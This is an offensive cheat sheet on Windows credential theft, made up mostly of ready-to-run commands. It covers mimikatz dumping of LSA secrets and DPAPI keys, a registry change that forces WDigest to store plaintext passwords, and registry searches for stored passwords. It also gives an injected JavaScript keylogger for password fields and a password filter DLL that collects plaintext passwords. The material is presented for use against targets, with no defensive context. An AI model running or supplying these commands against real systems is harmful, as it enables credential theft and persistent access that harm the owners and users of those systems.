# Miscellaneous Credential Theft

## LSA Secrets
- Stored at: `HKLM\SECURITY\Policy\Secrets`
- Contains: service account passwords, cached domain creds, DPAPI keys
```
# From memory (mimikatz)
token::elevate
lsadump::secrets
# From registry hives
reg save HKLM\SYSTEM system & reg save HKLM\security security
lsadump::secrets /system:system /security:security
```

## WDigest Plaintext Credential Forcing
- Windows 8.1+ no longer stores WDigest creds in plaintext by default
- Force plaintext storage (takes effect on next logon):
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
```
- Then dump: `sekurlsa::wdigest`

## Credentials in Registry
```cmd
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

## DPAPI
- Mimikatz: `dpapi::cred /in:C:\Users\user\AppData\...\Credentials\<GUID>`
- Master key: `sekurlsa::dpapi`

## Web Application Credential Hooking
- Inject JS into browser to hook password fields:
```javascript
t=""; $('input[type="password"]').onkeypress = function(e) { t+=e.key; localStorage.setItem("pw",t); }
```
- Useful when RDP'd into target with open web app

## Password Filter DLL
- Register custom DLL at `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Notification Packages`
- DLL receives plaintext passwords on password change events
